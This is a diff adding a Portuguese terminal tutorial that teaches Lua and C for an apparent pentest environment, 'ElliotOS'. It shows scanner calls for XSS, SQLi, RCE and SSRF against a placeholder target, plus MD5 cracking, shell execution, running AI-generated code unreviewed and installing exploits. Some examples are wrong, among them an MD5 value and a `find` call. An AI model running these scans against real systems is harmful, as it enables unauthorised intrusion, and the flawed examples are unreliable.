+    _ok "  O .. junta textos em Lua"
+    printf "\n"
+    _sec "Experimento 3 — sua primeira decisao"
+    _code "  idade = 20"
+    _code "  if idade >= 18 then"
+    _code "    print('maior de idade')"
+    _code "  else"
+    _code "    print('menor de idade')"
+    _code "  end"
+    printf "\n"
+    _sec "Experimento 4 — seu primeiro loop"
+    _code "  for i = 1, 5 do"
+    _code "    print('linha ' .. i)"
+    _code "  end"
+    printf "\n"
+    _sec "Experimento 5 — usando o ElliotOS de verdade"
+    _code "  print(net.get('https://ifconfig.me'))"
+    _ok "  Mostra seu IP publico — isso e pentest real!"
+    printf "\n"
+    printf "  \033[1;32m  Parabens!\033[0m Voce acaba de rodar seu primeiro scan de rede.\n"
+    printf "  Agora a Trilha 1 vai te ensinar Lua do zero ao avancado.\n\n"
+    _cont
+
+    # ══════════════════════════════════════════════════
+    # TRILHA 1 — LUA DO ZERO AO AVANCADO
+    # ══════════════════════════════════════════════════
+
+    _learn_step 6 35 "TRILHA 1 — Lua: O que e e por que usar"
+    _sec "O que e Lua"
+    printf "  Lua e uma linguagem leve, rapida e embarcavel criada no Brasil (PUC-Rio).\n"
+    printf "  E a linguagem de scripts do ElliotOS — todos os modulos de pentest\n"
+    printf "  sao acessiveis via Lua. O interpretador e o proprio 'ms'.\n\n"
+    _sec "Como rodar Lua no ElliotOS"
+    _code "ms                      # REPL interativo — digite Lua direto"
+    _code "ms -c 'print(\"ola\")'   # executa uma linha"
+    _code "ms -f meu_script.lua    # executa um arquivo"
+    printf "\n"
+    _sec "Primeiro programa"
+    _ok  "-- salve como ola.lua"
+    _ok  "print('Ola, ElliotOS!')"
+    _ok  "print(1 + 1)           --> 2"
+    _ok  "print(type('texto'))   --> string"
+    _cont
+
+    _learn_step 7 35 "TRILHA 1 — Variaveis e Tipos"
+    _sec "Tipos basicos de Lua"
+    _ok  "nil        -- ausencia de valor"
+    _ok  "boolean    -- true / false"
+    _ok  "number     -- inteiros e decimais (64-bit)"
+    _ok  "string     -- texto"
+    _ok  "table      -- arrays, dicionarios, objetos"
+    _ok  "function   -- funcoes sao valores de primeira classe"
+    printf "\n"
+    _sec "Variaveis"
+    _ok  "local x = 10            -- local ao bloco (recomendado)"
+    _ok  "y = 20                  -- global (evite)"
+    _ok  "local nome = 'Elliot'"
+    _ok  "local ativo = true"
+    _ok  "local nada = nil"
+    printf "\n"
+    _sec "Strings"
+    _ok  "local s = 'ola mundo'"
+    _ok  "local t = \"tambem funciona\""
+    _ok  "local multi = [[ texto"
+    _ok  "em varias linhas ]]"
+    _ok  "print(#s)               -- comprimento: 9"
+    _ok  "print(s .. '!')         -- concatenacao: 'ola mundo !'"
+    _ok  "print(s:upper())        -- 'OLA MUNDO'"
+    _ok  "print(s:sub(1,3))       -- 'ola'"
+    _cont
+
+    _learn_step 8 35 "TRILHA 1 — Operadores e Logica"
+    _sec "Operadores aritmeticos"
+    _ok  "print(10 + 3)    --> 13"
+    _ok  "print(10 - 3)    --> 7"
+    _ok  "print(10 * 3)    --> 30"
+    _ok  "print(10 / 3)    --> 3.3333..."
+    _ok  "print(10 // 3)   --> 3   (divisao inteira)"
+    _ok  "print(10 % 3)    --> 1   (resto)"
+    _ok  "print(2 ^ 8)     --> 256 (potencia)"
+    printf "\n"
+    _sec "Operadores relacionais"
+    _ok  "==  ~=  <  >  <=  >="
+    _ok  "print(1 == 1)    --> true"
+    _ok  "print(1 ~= 2)    --> true   (diferente)"
+    printf "\n"
+    _sec "Operadores logicos"
+    _ok  "and   or   not"
+    _ok  "print(true and false)   --> false"
+    _ok  "print(true or false)    --> true"
+    _ok  "print(not true)         --> false"
+    _ok  ""
+    _ok  "-- truque util: valor padrao"
+    _ok  "local x = nil"
+    _ok  "local v = x or 'padrao'   --> 'padrao'"
+    _cont
+
+    _learn_step 9 35 "TRILHA 1 — if, elseif, else"
+    _sec "Estrutura condicional"
+    _ok  "local nota = 75"
+    _ok  ""
+    _ok  "if nota >= 90 then"
+    _ok  "  print('A')"
+    _ok  "elseif nota >= 70 then"
+    _ok  "  print('B')          -- cai aqui"
+    _ok  "elseif nota >= 50 then"
+    _ok  "  print('C')"
+    _ok  "else"
+    _ok  "  print('Reprovado')"
+    _ok  "end"
+    printf "\n"
+    _sec "Condicional em uma linha (ternario via and/or)"
+    _ok  "local status = (nota >= 70) and 'aprovado' or 'reprovado'"
+    _ok  "print(status)    --> 'aprovado'"
+    printf "\n"
+    _sec "Nil e false sao falsos — tudo o mais e verdadeiro"
+    _ok  "if 0 then print('0 e true em Lua!') end    -- imprime!"
+    _ok  "if '' then print('string vazia e true') end -- imprime!"
+    _cont
+
+    _learn_step 10 35 "TRILHA 1 — Loops: while, repeat, for"
+    _sec "while"
+    _ok  "local i = 1"
+    _ok  "while i <= 5 do"
+    _ok  "  print(i)"
+    _ok  "  i = i + 1"
+    _ok  "end"
+    printf "\n"
+    _sec "repeat...until (executa ao menos uma vez)"
+    _ok  "local x = 0"
+    _ok  "repeat"
+    _ok  "  x = x + 1"
+    _ok  "until x >= 3"
+    _ok  "print(x)   --> 3"
+    printf "\n"
+    _sec "for numerico"
+    _ok  "for i = 1, 5 do print(i) end          -- 1 a 5"
+    _ok  "for i = 10, 1, -2 do print(i) end     -- 10 8 6 4 2"
+    printf "\n"
+    _sec "break"
+    _ok  "for i = 1, 100 do"
+    _ok  "  if i == 5 then break end"
+    _ok  "  print(i)"
+    _ok  "end"
+    _cont
+
+    _learn_step 11 35 "TRILHA 1 — Funcoes"
+    _sec "Definindo funcoes"
+    _ok  "local function soma(a, b)"
+    _ok  "  return a + b"
+    _ok  "end"
+    _ok  "print(soma(3, 4))   --> 7"
+    printf "\n"
+    _sec "Multiplos retornos"
+    _ok  "local function minmax(t)"
+    _ok  "  local mn, mx = t[1], t[1]"
+    _ok  "  for _, v in ipairs(t) do"
+    _ok  "    if v < mn then mn = v end"
+    _ok  "    if v > mx then mx = v end"
+    _ok  "  end"
+    _ok  "  return mn, mx"
+    _ok  "end"
+    _ok  "local a, b = minmax({3,1,7,2})"
+    _ok  "print(a, b)   --> 1  7"
+    printf "\n"
+    _sec "Funcoes como valores (closures)"
+    _ok  "local function contador(inicio)"
+    _ok  "  local n = inicio"
+    _ok  "  return function()"
+    _ok  "    n = n + 1"
+    _ok  "    return n"
+    _ok  "  end"
+    _ok  "end"
+    _ok  "local c = contador(0)"
+    _ok  "print(c(), c(), c())   --> 1  2  3"
+    _cont
+
+    _learn_step 12 35 "TRILHA 1 — Tables: arrays e dicionarios"
+    _sec "Array (indice comeca em 1)"
+    _ok  "local frutas = {'maca', 'banana', 'uva'}"
+    _ok  "print(frutas[1])        --> maca"
+    _ok  "print(#frutas)          --> 3"
+    _ok  "table.insert(frutas, 'kiwi')"
+    _ok  "table.remove(frutas, 1)"
+    printf "\n"
+    _sec "Dicionario (chave-valor)"
+    _ok  "local alvo = {"
+    _ok  "  host = '192.168.1.1',"
+    _ok  "  porta = 80,"
+    _ok  "  aberto = true"
+    _ok  "}"
+    _ok  "print(alvo.host)        --> 192.168.1.1"
+    _ok  "print(alvo['porta'])    --> 80"
+    _ok  "alvo.ssl = false        -- adiciona campo"
+    printf "\n"
+    _sec "Iteracao"
+    _ok  "-- array:"
+    _ok  "for i, v in ipairs(frutas) do print(i, v) end"
+    _ok  ""
+    _ok  "-- dicionario:"
+    _ok  "for k, v in pairs(alvo) do print(k, v) end"
+    _cont
+
+    _learn_step 13 35 "TRILHA 1 — Strings avancado"
+    _sec "Funcoes da biblioteca string"
+    _ok  "local url = 'http://alvo.com/login?id=1'"
+    _ok  ""
+    _ok  "url:find('login')          -- posicao: 19 23"
+    _ok  "url:match('(%w+)%.com')    -- captura: 'alvo'"
+    _ok  "url:gsub('http', 'https')  -- substitui"
+    _ok  "url:len()                  -- comprimento"
+    _ok  "url:rep(2, ', ')           -- repete"
+    _ok  "('  ola  '):match('^%s*(.-)%s*\$')  -- trim"
+    printf "\n"
+    _sec "string.format (como printf)"
+    _ok  "string.format('%s:%d', 'host', 80)  --> 'host:80'"
+    _ok  "string.format('%.2f', 3.14159)      --> '3.14'"
+    _ok  "string.format('%05d', 42)           --> '00042'"
+    printf "\n"
+    _sec "Padroes Lua (tipo regex simplificado)"
+    _ok  "%d   digito      %a  letra      %s  espaco"
+    _ok  "%w   alfanum     %p  pontuacao  %l  minuscula"
+    _ok  ".    qualquer    *   zero+      +   um+     ?  zero/um"
+    _ok  ""
+    _ok  "-- extrair IP de texto:"
+    _ok  "local txt = 'host: 192.168.1.1 porta 80'"
+    _ok  "print(txt:match('%d+%.%d+%.%d+%.%d+'))  --> 192.168.1.1"
+    _cont
+
+    _learn_step 14 35 "TRILHA 1 — Modulos e arquivos"
+    _sec "Criando um modulo"
+    _ok  "-- arquivo: utils.lua"
+    _ok  "local M = {}"
+    _ok  ""
+    _ok  "function M.sha_check(hash)"
+    _ok  "  return #hash == 64  -- SHA256 tem 64 hex chars"
+    _ok  "end"
+    _ok  ""
+    _ok  "function M.trim(s)"
+    _ok  "  return s:match('^%s*(.-)%s*\$')"
+    _ok  "end"
+    _ok  ""
+    _ok  "return M"
+    printf "\n"
+    _sec "Usando o modulo"
+    _ok  "local utils = dofile('utils.lua')   -- carrega arquivo"
+    _ok  "print(utils.trim('  ola  '))        --> 'ola'"
+    printf "\n"
+    _sec "No ElliotOS: nunca use require() para modulos do sistema"
+    _ok  "-- ERRADO:  local net = require('net')"
+    _ok  "-- CERTO:   net ja esta carregado automaticamente no ms"
+    _cont
+
+    _learn_step 15 35 "TRILHA 1 — OOP com metatables"
+    _sec "Orientacao a objetos em Lua"
+    _ok  "local Scanner = {}"
+    _ok  "Scanner.__index = Scanner"
+    _ok  ""
+    _ok  "function Scanner.novo(host, porta)"
+    _ok  "  return setmetatable({host=host, porta=porta, resultados={}}, Scanner)"
+    _ok  "end"
+    _ok  ""
+    _ok  "function Scanner:adicionar(info)"
+    _ok  "  table.insert(self.resultados, info)"
+    _ok  "end"
+    _ok  ""
+    _ok  "function Scanner:resumo()"
+    _ok  "  print(self.host..':'..self.porta, #self.resultados..' achados')"
+    _ok  "end"
+    _ok  ""
+    _ok  "-- uso:"
+    _ok  "local s = Scanner.novo('192.168.1.1', 80)"
+    _ok  "s:adicionar('XSS encontrado')"
+    _ok  "s:resumo()   --> 192.168.1.1:80  1 achados"
+    _cont
+
+    _learn_step 16 35 "TRILHA 1 — Erros e pcall"
+    _sec "Tratamento de erros"
+    _ok  "-- error() lanca um erro"
+    _ok  "local function dividir(a, b)"
+    _ok  "  if b == 0 then error('divisao por zero') end"
+    _ok  "  return a / b"
+    _ok  "end"
+    printf "\n"
+    _ok  "-- pcall captura o erro sem travar o programa"
+    _ok  "local ok, resultado = pcall(dividir, 10, 0)"
+    _ok  "if ok then"
+    _ok  "  print('resultado:', resultado)"
+    _ok  "else"
+    _ok  "  print('erro:', resultado)   --> erro: divisao por zero"
+    _ok  "end"
+    printf "\n"
+    _sec "xpcall — com traceback"
+    _ok  "local ok, err = xpcall(funcao_perigosa, function(e)"
+    _ok  "  return debug.traceback(e, 2)"
+    _ok  "end)"
+    printf "\n"
+    _sec "Em scripts de pentest: sempre use pcall em chamadas de rede"
+    _ok  "local ok, r = pcall(net.get, 'https://alvo.com')"
+    _ok  "if not ok then print('falhou:', r) end"
+    _cont
+
+    _learn_step 17 35 "TRILHA 1 — Corrotinas (concorrencia cooperativa)"
+    _sec "O que sao corrotinas"
+    _ok  "Corrotinas permitem pausar e retomar funcoes."
+    _ok  "Uteis para scraping, pipelines e I/O multiplo."
+    printf "\n"
+    _sec "Criando e rodando"
+    _ok  "local co = coroutine.create(function(a, b)"
+    _ok  "  print('inicio', a, b)"
+    _ok  "  local c = coroutine.yield(a + b)   -- pausa, retorna a+b"
+    _ok  "  print('continuou com', c)"
+    _ok  "end)"
+    _ok  ""
+    _ok  "local ok, v = coroutine.resume(co, 10, 20)"
+    _ok  "print('yield retornou:', v)         --> 30"
+    _ok  "coroutine.resume(co, 'dado extra')  -- retoma"
+    printf "\n"
+    _sec "coroutine.wrap — interface mais simples"
+    _ok  "local gen = coroutine.wrap(function()"
+    _ok  "  for i = 1, 3 do coroutine.yield(i) end"
+    _ok  "end)"
+    _ok  "print(gen(), gen(), gen())   --> 1  2  3"
+    _cont
+
+    # ══════════════════════════════════════════════════
+    # TRILHA 2 — LUA + ELLIOTOS API
+    # ══════════════════════════════════════════════════
+
+    _learn_step 18 35 "TRILHA 2 — ElliotOS: o ms e os modulos"
+    printf "  \033[1;33m  Trilha 2: Lua + ElliotOS API\033[0m\n\n"
+    _sec "Como o ElliotOS funciona"
+    _ok  "O ms e o Lua 5.4 compilado com 23 modulos C embutidos."
+    _ok  "Ao iniciar o REPL, todos os modulos ja estao no ambiente global."
+    _ok  "Voce escreve Lua puro e acessa pentest, rede, crypto, IA, etc."
+    printf "\n"
+    _sec "Modulos disponiveis (sem require)"
+    _ok  "net.*      HTTP, TCP, UDP, DNS, port scan, sockets"
+    _ok  "mod.*      23 scanners de pentest (XSS, SQLi, LFI...)"
+    _ok  "crypto.*   MD5, SHA, AES, Base64, JWT, HMAC"
+    _ok  "sys.*      threads, processos, env, sleep, tempo"
+    _ok  "fs.*       read, write, list, stat, glob, chmod"
+    _ok  "ai.*       CYN: chat, code, search, providers"
+    _ok  "db.*       SQLite embutido"
+    _ok  "pent.*     utilitarios de pentest extras"
+    _ok  "ui.*       interface no terminal"
+    _ok  "agent.*    agente autonomo com tools"
+    _cont
+
+    _learn_step 19 35 "TRILHA 2 — net.*: HTTP e rede"
+    _sec "HTTP GET e POST"
+    _ok  "local r = net.get('https://httpbin.org/get')"
+    _ok  "print(r.code)           --> 200"
+    _ok  "print(#r.body)          -- tamanho da resposta"
+    _ok  "print(r.headers['content-type'])"
+    _ok  ""
+    _ok  "local r2 = net.post('https://httpbin.org/post',"
+    _ok  "  'user=admin&pass=123',"
+    _ok  "  {headers={['Content-Type']='application/x-www-form-urlencoded'}})"
+    printf "\n"
+    _sec "DNS, ping e port scan"
+    _ok  "net.dns('google.com')              -- tabela de IPs"
+    _ok  "net.ping('8.8.8.8')               -- ms ou nil"
+    _ok  "local portas = net.scan('192.168.1.1', 1, 1024)"
+    _ok  "for _, p in ipairs(portas) do print('aberta:', p) end"
+    printf "\n"
+    _sec "Socket TCP"
+    _ok  "local s = net.tcp('192.168.1.1', 80)"
+    _ok  "s:send('GET / HTTP/1.0\\r\\nHost: alvo\\r\\n\\r\\n')"
+    _ok  "print(s:recv(4096))"
+    _ok  "s:close()"
+    _cont
+
+    _learn_step 20 35 "TRILHA 2 — mod.*: scanners de pentest"
+    _sec "Scanners basicos"
+    _ok  "mod.xss('http://alvo.com/?q=')        -- XSS reflected/stored"
+    _ok  "mod.sqli('http://alvo.com/?id=')       -- SQLi multi-tecnica"
+    _ok  "mod.lfi('http://alvo.com/?file=')      -- LFI / path traversal"
+    _ok  "mod.rce('http://alvo.com/?cmd=')       -- RCE"
+    _ok  "mod.ssrf('http://alvo.com/?url=')      -- SSRF"
+    _ok  "mod.ssti('http://alvo.com/?tpl=')      -- template injection"
+    printf "\n"
+    _sec "Analise de infraestrutura"
+    _ok  "mod.headers('https://alvo.com')        -- security headers"
+    _ok  "mod.waf('https://alvo.com')            -- detecta WAF"
+    _ok  "mod.cors('https://alvo.com')           -- CORS misconfig"
+    _ok  "mod.subdomains('alvo.com')             -- enumeracao"
+    _ok  "mod.dirs('http://alvo.com')            -- bruteforce dirs"
+    _ok  "mod.secrets('http://alvo.com')         -- secrets expostos"
+    printf "\n"
+    _sec "Pipeline completo"
+    _ok  "-- roda todos os scanners em sequencia:"
+    _ok  "mod.chain('http://alvo.com')"
+    _ok  ""
+    _ok  "-- spider + scan:"
+    _ok  "local urls = mod.spider('http://alvo.com', 50)"
+    _ok  "for _, url in ipairs(urls) do"
+    _ok  "  mod.xss(url)"
+    _ok  "end"
+    _cont
+
+    _learn_step 21 35 "TRILHA 2 — crypto.*: criptografia"
+    _sec "Hashes"
+    _ok  "crypto.md5('senha')         --> 'd41d8cd98f00b204...'"
+    _ok  "crypto.sha1('senha')        --> hash SHA1"
+    _ok  "crypto.sha256('senha')      --> hash SHA256 (64 hex)"
+    _ok  "crypto.sha512('senha')      --> hash SHA512"
+    _ok  "crypto.hmac('chave','dado','sha256')  -- HMAC"
+    printf "\n"
+    _sec "Encoding"
+    _ok  "crypto.b64e('ola mundo')    --> 'b2xhIG11bmRv'"
+    _ok  "crypto.b64d('b2xhIG11bmRv')-- 'ola mundo'"
+    printf "\n"
+    _sec "AES e JWT"
+    _ok  "local enc = crypto.aes_enc('chave32bytes_____________', 'segredo')"
+    _ok  "local dec = crypto.aes_dec('chave32bytes_____________', enc)"
+    _ok  ""
+    _ok  "-- JWT: decodifica sem verificar assinatura"
+    _ok  "local t = crypto.jwt('eyJhbGc...')"
+    _ok  "print(t.header.alg)    -- algoritmo usado"
+    _ok  "print(t.payload.sub)   -- subject/usuario"
+    printf "\n"
+    _sec "Uso em pentest"
+    _ok  "-- crack MD5 simples:"
+    _ok  "local palavras = {'admin','123456','senha','root'}"
+    _ok  "local alvo = 'd41d8cd98f00b204e9800998ecf8427e'"
+    _ok  "for _, p in ipairs(palavras) do"
+    _ok  "  if crypto.md5(p) == alvo then print('senha:', p) end"
+    _ok  "end"
+    _cont
+
+    _learn_step 22 35 "TRILHA 2 — sys.* e fs.*: sistema e arquivos"
+    _sec "sys.* — controle do sistema"
+    _ok  "sys.info()              -- CPU, RAM, arch, deps"
+    _ok  "sys.sleep(2)            -- pausa 2 segundos"
+    _ok  "sys.time()              -- epoch em segundos"
+    _ok  "sys.time_ms()           -- epoch em milissegundos"
+    _ok  "sys.env('HOME')         -- le variavel de ambiente"
+    _ok  "sys.env('MYVAR','abc')  -- seta variavel"
+    _ok  "sys.pid()               -- PID do processo"
+    _ok  "sys.sh('ls -la')        -- executa shell"
+    printf "\n"
+    _sec "Threads em Lua (sys.thread)"
+    _ok  "local t1 = sys.thread(function()"
+    _ok  "  net.scan('192.168.1.1', 1, 512)"
+    _ok  "end)"
+    _ok  "local t2 = sys.thread(function()"
+    _ok  "  net.scan('192.168.1.1', 513, 1024)"
+    _ok  "end)"
+    _ok  "sys.join(t1); sys.join(t2)"
+    printf "\n"
+    _sec "fs.* — arquivos"
+    _ok  "fs.read('/etc/hosts')              -- string com conteudo"
+    _ok  "fs.write('log.txt', 'linha\\n')     -- cria/sobrescreve"
+    _ok  "fs.append('log.txt', 'mais\\n')     -- adiciona"
+    _ok  "fs.list('/home')                   -- tabela de nomes"
+    _ok  "fs.stat('/etc/passwd')             -- {size, mtime, ...}"
+    _ok  "fs.isfile('/etc/passwd')           -- true/false"
+    _ok  "fs.mkdir('/tmp/scan_out')          -- cria dir"
+    _ok  "fs.glob('/tmp/*.txt')              -- lista por padrao"
+    _cont
+
+    _learn_step 23 35 "TRILHA 2 — ai.*: CYN inteligencia artificial"
+    _sec "Chat e perguntas"
+    _ok  "ai.ask('o que e SQLi?')           -- resposta direta"
+    _ok  "ai.chat('explique SSRF')          -- com historico"
+    _ok  "ai.clear()                        -- limpa historico"
+    printf "\n"
+    _sec "Geracao de codigo"
+    _ok  "local cod = ai.code('escreva um port scanner em Lua')"
+    _ok  "print(cod)"
+    _ok  "-- ou execute direto:"
+    _ok  "load(ai.code('funcao que faz ping em tabela de IPs'))()"
+    printf "\n"
+    _sec "Providers"
+    _ok  "ai.provider('sky')                -- gratuito, sem key"
+    _ok  "ai.provider('pollinations')       -- gratuito"
+    _ok  "ai.provider('groq','llama-3.3-70b-versatile')  -- key"
+    _ok  "ai.provider('openai','gpt-4o')   -- key"
+    _ok  "ai.provider('gemini')             -- key Google"
+    _ok  "ai.key('SUA_KEY_AQUI')            -- configura key"
+    printf "\n"
+    _sec "Uso em pentest assistido"
+    _ok  "local headers = mod.headers('https://alvo.com')"
+    _ok  "local analise = ai.ask('analise esses headers de seguranca: '..headers)"
+    _ok  "print(analise)"
+    _cont
+
+    _learn_step 24 35 "TRILHA 2 — db.*: banco de dados SQLite"
+    _sec "Abrindo e criando tabelas"
+    _ok  "local db = db.open('scan.db')"
+    _ok  ""
+    _ok  "db:exec([["
+    _ok  "  CREATE TABLE IF NOT EXISTS resultados ("
+    _ok  "    id    INTEGER PRIMARY KEY,"
+    _ok  "    host  TEXT,"
+    _ok  "    vuln  TEXT,"
+    _ok  "    data  TEXT"
+    _ok  "  )"
+    _ok  "]])"
+    printf "\n"
+    _sec "Insert e query"
+    _ok  "db:exec(string.format("
+    _ok  "  \"INSERT INTO resultados VALUES(NULL,'%s','%s',datetime('now'))\","
+    _ok  "  'alvo.com', 'XSS'))"
+    _ok  ""
+    _ok  "local rows = db:query('SELECT * FROM resultados')"
+    _ok  "for _, row in ipairs(rows) do"
+    _ok  "  print(row.host, row.vuln, row.data)"
+    _ok  "end"
+    _ok  ""
+    _ok  "db:close()"
+    printf "\n"
+    _sec "Uso pratico: salvar scans"
+    _ok  "-- escaneia e salva tudo no banco:"
+    _ok  "local urls = mod.spider('http://alvo.com', 100)"
+    _ok  "for _, url in ipairs(urls) do"
+    _ok  "  local r = mod.xss(url)"
+    _ok  "  if r and r.vuln then"
+    _ok  "    db:exec(\"INSERT INTO resultados VALUES(NULL,'\"..url..\"','XSS',datetime('now'))\")"
+    _ok  "  end"
+    _ok  "end"
+    _cont
+
+    _learn_step 25 35 "TRILHA 2 — Scripts profissionais com ElliotOS"
+    _sec "Estrutura de um script completo"
+    _ok  "#!/usr/bin/env ms"
+    _ok  "-- recon.lua — reconhecimento basico"
+    _ok  "-- Uso: ms --script recon -- alvo.com"
+    _ok  ""
+    _ok  "local alvo = arg[1] or error('uso: recon -- <host>')"
+    _ok  "local db_scan = db.open('/tmp/recon_'..alvo..'.db')"
+    _ok  ""
+    _ok  "print('[*] Alvo: '..alvo)"
+    _ok  ""
+    _ok  "-- DNS"
+    _ok  "local ips = net.dns(alvo)"
+    _ok  "for _, ip in ipairs(ips) do print('[+] IP:', ip) end"
+    _ok  ""
+    _ok  "-- port scan em thread"
+    _ok  "local portas = {}"
+    _ok  "local t = sys.thread(function()"
+    _ok  "  portas = net.scan(ips[1], 1, 1024)"
+    _ok  "end)"
+    _ok  ""
+    _ok  "-- headers enquanto scanneia"
+    _ok  "local h = mod.headers('https://'..alvo)"
+    _ok  "sys.join(t)"
+    _ok  ""
+    _ok  "print('[+] Portas abertas:', #portas)"
+    _ok  "print('[+] Headers analisados')"
+    _cont
+
+    _learn_step 26 35 "TRILHA 2 — lpm, xpm e scripts externos"
+    _sec "lpm — gerenciador de modulos Lua"
+    _ok  "lpm install luasocket      # socket Lua puro"
+    _ok  "lpm install luajson        # JSON"
+    _ok  "lpm install --all          # instala lista curada"
+    _ok  "lpm list                   # modulos instalados"
+    _ok  "lpm --script -s 'sqli'     # busca exploit-db"
+    _ok  "lpm --script -i 42         # instala exploit #42"
+    printf "\n"
+    _sec "xpm — ferramentas de pentest externas"
+    _ok  "xpm install nuclei         # scanner de templates"
+    _ok  "xpm install sqlmap         # SQLi automatizado"
+    _ok  "xpm install ffuf           # fuzzer HTTP"
+    _ok  "xpm install nmap           # port scan avancado"
+    _ok  "xpm search web             # busca ferramentas web"
+    _ok  "xpm list                   # instaladas"
+    printf "\n"
+    _sec "Integrando xpm com Lua"
+    _ok  "-- rodar nuclei a partir do script Lua:"
+    _ok  "local out = sys.sh('nuclei -u https://alvo.com -silent')"
+    _ok  "for linha in out:gmatch('[^\\n]+') do"
+    _ok  "  if linha:find('CRITICAL','HIGH') then"
+    _ok  "    print('[!]', linha)"
+    _ok  "  end"
+    _ok  "end"
+    _cont
+
+    # ══════════════════════════════════════════════════
+    # TRILHA 3 — C NO ELLIOTOS
+    # ══════════════════════════════════════════════════
+
+    _learn_step 27 35 "TRILHA 3 — C: base e diferenca para Lua"
+    printf "  \033[1;33m  Trilha 3: C no ElliotOS\033[0m\n\n"
+    _sec "Por que C no ElliotOS"
+    _ok  "O ElliotOS e escrito em C. Os 23 modulos do ms sao C."
+    _ok  "Scripts .c em ms --script compilam automaticamente via cxx."
+    _ok  "C e necessario para: performance, sockets raw, syscalls,"
+    _ok  "modulos customizados e ferramentas de baixo nivel."
+    printf "\n"
+    _sec "Diferencas principais C vs Lua"
+    _ok  "C: compilado, tipado, manual de memoria, rapido"
+    _ok  "Lua: interpretado, dinamico, garbage collected, flexivel"
+    _ok  ""
+    _ok  "C usa:   int, char, float, double, struct, pointer"
+    _ok  "Lua usa: number, string, table, boolean, nil (automatico)"
+    printf "\n"
+    _sec "Primeiro programa C no ElliotOS"
+    _ok  "// ola.c"
+    _ok  "#include <stdio.h>"
+    _ok  ""
+    _ok  "int main(void) {"
+    _ok  "    printf(\"Ola, ElliotOS!\\n\");"
+    _ok  "    return 0;"
+    _ok  "}"
+    _ok  ""
+    _ok  "-- Compilar e rodar:"
+    _ok  "cxx ola.c -o ola && ./ola"
+    _ok  "-- ou direto:"
+    _ok  "ms --script ola.c"
+    _cont
+
+    _learn_step 28 35 "TRILHA 3 — C: tipos, variaveis, operadores"
+    _sec "Tipos fundamentais"
+    _ok  "int     x = 42;          // inteiro (32-bit)"
+    _ok  "long    y = 123456789L;  // inteiro longo (64-bit)"
+    _ok  "float   f = 3.14f;       // decimal simples"
+    _ok  "double  d = 3.14159;     // decimal duplo"
+    _ok  "char    c = 'A';         // caractere / byte"
+    _ok  "char   *s = \"texto\";     // ponteiro para string"
+    _ok  "int     arr[5] = {1,2,3,4,5};  // array"
+    printf "\n"
+    _sec "Modificadores de tipo (tamanho garantido — prefira em pentest)"
+    _ok  "#include <stdint.h>"
+    _ok  "uint8_t   b = 0xFF;      // 1 byte unsigned"
+    _ok  "uint16_t  p = 443;       // 2 bytes (porta)"
+    _ok  "uint32_t  ip = 0xC0A801; // 4 bytes (IPv4)"
+    _ok  "int64_t   ts;            // timestamp"
+    printf "\n"
+    _sec "Operadores bitwise (essencial em redes/crypto)"
+    _ok  "x & y   -- AND bit a bit"
+    _ok  "x | y   -- OR bit a bit"
+    _ok  "x ^ y   -- XOR (muito usado em criptografia)"
+    _ok  "~x      -- NOT / complemento"
+    _ok  "x << n  -- shift esquerda (multiplica por 2^n)"
+    _ok  "x >> n  -- shift direita  (divide por 2^n)"
+    _ok  ""
+    _ok  "// mascara de sub-rede:"
+    _ok  "uint32_t mask = 0xFFFFFF00;  // /24"
+    _ok  "uint32_t net  = ip & mask;"
+    _cont
+
+    _learn_step 29 35 "TRILHA 3 — C: if, loops, funcoes"
+    _sec "Condicional"
+    _ok  "int porta = 443;"
+    _ok  "if (porta == 80) {"
+    _ok  "    printf(\"HTTP\\n\");"
+    _ok  "} else if (porta == 443) {"
+    _ok  "    printf(\"HTTPS\\n\");   // cai aqui"
+    _ok  "} else {"
+    _ok  "    printf(\"outra\\n\");"
+    _ok  "}"
+    printf "\n"
+    _sec "Loops"
+    _ok  "for (int i = 0; i < 10; i++) { printf(\"%d\\n\", i); }"
+    _ok  ""
+    _ok  "int n = 0;"
+    _ok  "while (n < 5) { n++; }"
+    _ok  ""
+    _ok  "do { n--; } while (n > 0);"
+    printf "\n"
+    _sec "Funcoes"
+    _ok  "// declaracao (prototipo)"
+    _ok  "int soma(int a, int b);"
+    _ok  ""
+    _ok  "// definicao"
+    _ok  "int soma(int a, int b) {"
+    _ok  "    return a + b;"
+    _ok  "}"
+    _ok  ""
+    _ok  "// ponteiro de funcao (callbacks)"
+    _ok  "int (*fn)(int, int) = soma;"
+    _ok  "printf(\"%d\\n\", fn(3, 4));   // 7"
+    _cont
+
+    _learn_step 30 35 "TRILHA 3 — C: ponteiros e memoria"
+    _sec "Ponteiros — o coracao do C"
+    _ok  "int x = 42;"
+    _ok  "int *p = &x;     // p aponta para x"
+    _ok  "printf(\"%d\\n\", *p);    // desreferencia: 42"
+    _ok  "*p = 99;          // muda x via ponteiro"
+    _ok  "printf(\"%d\\n\", x);     // 99"
+    printf "\n"
+    _sec "Alocacao dinamica"
+    _ok  "#include <stdlib.h>"
+    _ok  ""
+    _ok  "char *buf = malloc(1024);       // aloca 1KB"
+    _ok  "if (!buf) { perror(\"malloc\"); exit(1); }"
+    _ok  ""
+    _ok  "snprintf(buf, 1024, \"payload=%s\", input);"
+    _ok  "// usa buf..."
+    _ok  "free(buf);                      // SEMPRE libere"
+    printf "\n"
+    _sec "Strings em C (arrays de char terminados em 0)"
+    _ok  "#include <string.h>"
+    _ok  "char dst[256];"
+    _ok  "strncpy(dst, src, sizeof(dst)-1);  // copia segura"
+    _ok  "strncat(dst, \" sufixo\", sizeof(dst)-strlen(dst)-1);"
+    _ok  "strlen(s)          -- comprimento"
+    _ok  "strcmp(a, b)       -- compara (0 = igual)"
+    _ok  "strstr(hay, needle)-- busca substring"
+    _ok  ""
+    _ok  "// NUNCA use strcpy/strcat sem limite — buffer overflow!"
+    _cont
+
+    _learn_step 31 35 "TRILHA 3 — C: sockets e rede raw"
+    _sec "Socket TCP em C (como o ms faz internamente)"
+    _ok  "#include <stdio.h>"
+    _ok  "#include <string.h>"
+    _ok  "#include <sys/socket.h>"
+    _ok  "#include <netinet/in.h>"
+    _ok  "#include <arpa/inet.h>"
+    _ok  "#include <unistd.h>"
+    _ok  ""
+    _ok  "int fd = socket(AF_INET, SOCK_STREAM, 0);"
+    _ok  "struct sockaddr_in addr = {"
+    _ok  "    .sin_family = AF_INET,"
+    _ok  "    .sin_port   = htons(80),"
+    _ok  "};"
+    _ok  "inet_pton(AF_INET, \"192.168.1.1\", &addr.sin_addr);"
+    _ok  ""
+    _ok  "if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {"
+    _ok  "    char req[] = \"GET / HTTP/1.0\\r\\n\\r\\n\";"
